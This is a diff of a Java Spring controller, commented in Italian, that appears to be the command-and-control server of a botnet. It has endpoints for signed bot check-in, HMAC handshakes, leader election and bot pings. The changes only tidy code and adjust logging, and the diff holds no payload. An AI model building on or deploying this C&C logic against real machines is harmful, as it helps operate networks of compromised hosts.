@@ -59,27 +59,21 @@ public class CommandController {
 
 	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
 	@ResponseBody
-	public Pairs<Long, Integer> botFirstAcces(@RequestBody String data, HttpServletResponse error,
-			HttpServletRequest req) throws IOException {
+	public Pairs<Long, Integer> botFirstAcces(@RequestBody String data, HttpServletResponse error, HttpServletRequest req) throws IOException {
 		System.out.println("Richiesta di challenge ricevuta da " + req.getRemoteAddr());
 		Pairs<Long, Integer> response = new Pairs<Long, Integer>();
-
 		String idBot;
 		Boolean flag = false;
 		if (configEngine.isCommandandconquerStatus()) {
-
 			if (data != null) {
-				System.out.println("i dati non sono null");
 				String[] msgs = data.split("<CS>");
 				idBot = msgs[0];
 				String idBotSign = msgs[1];
 				Bot b = cmm.getbServ().searchBotId(idBot);
 				if (b != null) {
-					System.out.println("conosco gia il bot");
+					System.out.println("Conosco gia il bot: " + req.getRemoteAddr());
 					try {
-						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,
-								cmm.getPki().rebuildPuK(b.getPubKey()));
-						System.out.println("Ritorno verifica " + flag);
+						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign, cmm.getPki().rebuildPuK(b.getPubKey()));
 						if (flag) {
 							Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(req.getRemoteAddr()), idBot);
 							cmm.getnServ().getAliveBot().add(botAlive);
@@ -107,8 +101,7 @@ public class CommandController {
 
 	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
 	@ResponseBody
-	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
-			HttpServletRequest req) throws IOException {
+	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error, HttpServletRequest req) throws IOException {
 		System.out.println("Richiesta con hmac ricevuta da " + req.getRemoteAddr());
 		String response = "";
 		if (configEngine.isCommandandconquerStatus()) {
@@ -128,10 +121,6 @@ public class CommandController {
 	public List<Role> newKingRoles(@RequestBody String idBot, HttpServletRequest req) {
 		System.out.println("Richiesta RUOLI del database da " + req.getRemoteAddr());
 		idBot = cmm.getCrypto().decryptAES(idBot);
-
-		System.out.println("id b" + idBot);
-		System.out.println("id b2" + cmm.getpServ().getNewKing());
-		System.out.println("id b3" + cmm.getpServ().getNewKing().equals(idBot));
 
 		if (!cmm.getpServ().getNewKing().equals(idBot))
 			return null;
@@ -207,7 +196,6 @@ public class CommandController {
 
 	/////////////////////////////////////////////////////////////////////////
 
-	// TODO RIMUOVERE TEST
 	@RequestMapping(value = "/election", method = RequestMethod.GET)
 	@ResponseBody
 	public boolean startElection(HttpServletRequest req) {
@@ -221,7 +209,8 @@ public class CommandController {
 	// Controller che intercetta i ping dei bot
 	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
 	@ResponseBody
-	public String BotPing(HttpServletResponse error) throws IOException {
+	public String BotPing(HttpServletResponse error, HttpServletRequest req) throws IOException {
+		System.out.println("Ricevuto ping dal bot" + req.getRemoteAddr());
 		String response = "";
 		if (configEngine.isCommandandconquerStatus()) {
 			response = "ping";
@@ -229,6 +218,6 @@ public class CommandController {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
 		return response;
-	}	
+	}
 
 }
